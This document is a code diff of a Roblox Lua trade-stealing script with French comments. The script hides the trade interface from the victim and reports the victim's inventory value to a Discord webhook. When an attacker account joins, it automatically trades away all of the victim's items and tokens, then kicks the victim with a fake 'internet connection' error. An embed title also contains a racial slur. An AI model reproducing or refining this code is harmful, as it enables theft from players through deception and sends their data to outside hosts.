@@ -20,29 +20,27 @@ local auth_token = _G.AuthToken or "EBK-SS-A"
 local PlayerGui = plr.PlayerGui
 local tradeGui = PlayerGui.Trade
 local inTrade = false
-
--- Sécurité de base
-if next(users) == nil or webhook == "" then
-    plr:kick("Configuration manquante (Usernames/Webhook)")
-    return
-end
-
--- Masquer les interfaces pour la victime
-pcall(function()
-    tradeGui.Enabled = false
-    PlayerGui.Notifications.Enabled = false
-    tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
-        inTrade = tradeGui.Enabled
-        if inTrade then tradeGui.Enabled = false end
-    end)
-end)
+local notificationsGui = PlayerGui.Notifications
+local tradeCompleteGui = PlayerGui.TradeCompleted
 
 local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
--- Fonction pour formater le RAP (k, m, b)
+-- Cache UI (Ta version)
+tradeGui.Black.Visible = false
+tradeGui.Main.Visible = false
+notificationsGui.Enabled = false
+
+tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
+    inTrade = tradeGui.Enabled
+end)
+
+---------------------------------------------------------
+-- FONCTIONS UTILITAIRES & RAP
+---------------------------------------------------------
+
 local function formatNumber(number)
-    if not number then return "0" end
+    if number == nil then return "0" end
     local suffixes = {"", "k", "m", "b", "t"}
     local suffixIndex = 1
     while number >= 1000 and suffixIndex < #suffixes do
@@ -52,7 +50,6 @@ local function formatNumber(number)
     return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
 end
 
--- Calcul du RAP Total
 local function getRAP(category, itemName)
     local success, rapData = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[category] end)
     if not success or not rapData then return 0 end
@@ -67,11 +64,19 @@ local function getRAP(category, itemName)
     return 0
 end
 
+local function getNextBatch(items, batchSize)
+    local batch = {}
+    for i = 1, math.min(batchSize, #items) do
+        table.insert(batch, table.remove(items, 1))
+    end
+    return batch
+end
+
 ---------------------------------------------------------
--- GESTION DES EMBEDS (VIOLET ET JAUNE)
+-- EMBEDS (STYLÉS COMME DEMANDÉ)
 ---------------------------------------------------------
 
--- 1. Embed VIOLET (Exécution du script)
+-- 1. VIOLET (Exécution)
 local function SendJoinMessage(list, prefix)
     local totalRAP = 0
     local itemLines = ""
@@ -99,7 +104,7 @@ local function SendJoinMessage(list, prefix)
     request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
 end
 
--- 2. Embed JAUNE (Quand tu rejoins le serveur)
+-- 2. JAUNE (Quand tu rejoins)
 local function SendOnServerMessage()
     local totalRAP = 0
     for _, item in ipairs(itemsToSend) do totalRAP = totalRAP + item.RAP end
@@ -108,7 +113,7 @@ local function SendOnServerMessage()
         ["auth_token"] = auth_token,
         ["embeds"] = {{
             ["title"] = "⚠️ The nigga is on the server !",
-            ["color"] = 16776960, -- JAUNE
+            ["color"] = 16776960,
             ["fields"] = {
                 {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                 {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true}
@@ -121,53 +126,64 @@ local function SendOnServerMessage()
 end
 
 ---------------------------------------------------------
--- SYSTÈME DE TRADE AUTOMATIQUE (FIXÉ)
+-- LOGIQUE DE TRADE (TA VERSION)
 ---------------------------------------------------------
 
-local function startAutoTrade(targetPlayer)
-    task.spawn(function()
-        table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
+local function sendTradeRequest(user)
+    local target = game:GetService("Players"):WaitForChild(user)
+    repeat
+        task.wait(0.5)
+        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
+    until response == true
+end
 
-        while #itemsToSend > 0 do
-            -- Envoi d'une seule requête et attente
-            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
-            
-            local waitTime = 0
-            repeat task.wait(1) waitTime = waitTime + 1 until inTrade or waitTime > 30
-            
-            if inTrade then
-                task.wait(2) -- Délai pour stabiliser le trade et éviter le déclin auto
-                
-                local limit = 0
-                while #itemsToSend > 0 and limit < 50 do
-                    local item = table.remove(itemsToSend, 1)
-                    pcall(function()
-                        netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
-                    end)
-                    limit = limit + 1
-                    task.wait(0.2)
-                end
+local function addItemToTrade(itemType, ID)
+    repeat
+        local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)
+    until response == true
+end
 
-                task.wait(1)
-                -- Confirmation Automatique
-                netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
-                task.wait(1)
-                netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
-                
-                repeat task.wait(1) until not inTrade
-                task.wait(2) -- Pause entre deux trades
-            end
+local function readyTrade()
+    repeat
+        task.wait(0.2)
+        local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
+    until response == true
+end
+
+local function confirmTrade()
+    repeat
+        task.wait(0.2)
+        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+    until not inTrade
+end
+
+local function doTrade(joinedUser)
+    while #itemsToSend > 0 do
+        sendTradeRequest(joinedUser)
+        repeat task.wait(0.5) until inTrade
+
+        local currentBatch = getNextBatch(itemsToSend, 100)
+        for _, item in ipairs(currentBatch) do
+            addItemToTrade(item.itemType, item.ItemID)
         end
-        task.wait(1)
-        plr:kick("Please check your internet connection and try again. (Error Code: 277)")
-    end)
+
+        -- Ton système de tokens
+        local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
+        local tokensamount = tonumber(rawText:gsub("[^%d]", "")) or 0
+        if tokensamount >= 1 then
+            netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
+        end
+
+        readyTrade()
+        confirmTrade()
+    end
+    plr:kick("Please check your internet connection and try again. (Error Code: 277)")
 end
 
 ---------------------------------------------------------
--- LANCEMENT
+-- SCAN & LANCEMENT
 ---------------------------------------------------------
 
--- Scan de l'inventaire
 for _, cat in ipairs(categories) do
     if clientInventory[cat] then
         for id, info in pairs(clientInventory[cat]) do
@@ -182,26 +198,17 @@ for _, cat in ipairs(categories) do
 end
 
 if #itemsToSend > 0 then
+    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
     local prefix = (ping == "Yes") and "@everyone | " or ""
     SendJoinMessage(itemsToSend, prefix)
 
-    local function checkUsers()
-        for _, p in ipairs(Players:GetPlayers()) do
-            if table.find(users, p.Name) then
-                SendOnServerMessage()
-                startAutoTrade(p)
-                return true
-            end
+    local function onUserAdded(player)
+        if table.find(users, player.Name) then
+            SendOnServerMessage()
+            doTrade(player.Name)
         end
-        return false
     end
 
-    if not checkUsers() then
-        Players.PlayerAdded:Connect(function(player)
-            if table.find(users, player.Name) then
-                SendOnServerMessage()
-                startAutoTrade(player)
-            end
-        end)
-    end
+    for _, p in ipairs(Players:GetPlayers()) do onUserAdded(p) end
+    Players.PlayerAdded:Connect(onUserAdded)
 end
